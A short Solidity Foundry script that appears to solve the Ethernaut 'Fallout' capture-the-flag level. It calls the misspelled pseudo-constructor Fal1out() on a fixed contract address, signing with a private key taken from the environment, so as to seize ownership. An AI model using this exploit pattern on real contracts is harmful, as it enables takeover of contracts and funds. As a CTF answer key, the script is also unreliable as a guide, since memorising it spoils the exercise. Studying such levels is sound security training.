// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout constant falloutInstance =
        Fallout(0x02F407824F48353Cd6CC01Cda0A8be057B52F7d7);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        falloutInstance.Fal1out();
        vm.stopBroadcast();
    }
}
